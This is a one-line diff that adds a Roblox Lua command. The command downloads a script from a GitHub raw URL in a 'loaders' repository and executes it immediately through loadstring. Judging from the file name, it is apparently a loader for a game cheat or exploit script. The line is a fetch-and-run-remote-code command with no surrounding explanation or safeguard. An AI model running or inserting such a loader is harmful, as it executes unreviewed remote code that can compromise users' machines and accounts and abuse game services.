@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/shogun-s-reign-spam5-0low98tefz6j6g.lua"))()
